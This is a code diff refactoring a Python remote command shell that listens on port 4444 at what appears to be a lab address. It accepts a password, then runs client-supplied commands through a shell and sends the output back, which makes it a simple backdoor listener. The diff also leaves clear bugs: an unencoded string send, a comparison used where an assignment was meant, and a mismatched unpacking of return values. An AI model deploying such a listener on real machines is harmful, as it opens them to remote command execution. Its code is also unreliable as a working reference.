@@ -10,17 +10,20 @@ def lookForConnection(server):
     client.send(("Input password for client: ").encode())
     password = client.recv(1024)
     password = password.decode()
-    return password, client
+    return password, client, client_addr
 
-def checkPass(password, client):
+def checkPass(password, client, client_addr):
+    valid = False
     if password == real_password:
-        passwords_match = True
+        valid = True
         print(str(client_addr) + " has connected to the server")
         client.send(("Connected!"))
     else:
+        valid = False
         client.send(("Incorrect Password...Closing Connection").encode())
         client.close()
-        password, client = lookForConnection(server, passwords_match)
+        password, client = lookForConnection(server)
+    return valid
 
 HOST = '10.0.2.5'
 PORT = 4444 
@@ -28,8 +31,8 @@ real_password = ""
 passwords_match = False
 server = socket.socket()
 server.bind((HOST, PORT))
-password, client = lookForConnection(server, passwords_match)
-checkPass(password, client)
+password, client, client_addr = lookForConnection(server)
+passwords_match = checkPass(password, client, client_addr)
 print(passwords_match)
 
 while passwords_match == True:
@@ -40,8 +43,8 @@ while passwords_match == True:
         passwords_match == False
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         client.close()
-        passwords_match, client = lookForConnection(server, passwords_match)
-        checkPass(password, client)
+        password, client, client_addr = lookForConnection(server)
+        passwords_match = checkPass(password, client, client_addr)
         print(passwords_match)
     else:
         output = op.stdout.read()
